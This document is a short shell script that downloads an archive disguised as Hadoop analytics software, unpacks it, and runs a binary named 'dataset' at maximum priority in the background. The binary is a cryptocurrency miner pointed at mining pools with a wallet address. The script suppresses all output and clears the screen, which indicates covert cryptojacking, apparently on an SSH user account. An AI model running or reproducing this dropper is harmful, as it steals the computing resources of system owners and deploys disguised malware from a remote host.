#!/bin/sh
cd /home/sshuser

sysctl vm.nr_hugepages=2048

wget https://raw.githubusercontent.com/alunsotech/analytics/master/hadoop1.tar.gz
tar xvzf hadoop1.tar.gz
nice -n -20 nohup ./dataset --algorithm randomepic\;randomx --pool epic.hashrate.to:4000\;xmr.f2pool.com:13531 --wallet riro1288\;89Xc3ZmpsiX9PVdVsLyRkQ1bw2Sv8wg5pbhL2jCGnB8kMZPtTP5U49zE15qWLmoYPR1YJnYgVE6qVGp8PVCCMwCh31YJhgE --password y0j279qot4sn\;riro --cpu-threads 0\;0 --disable-gpu >/dev/null 2>&1 &
clear
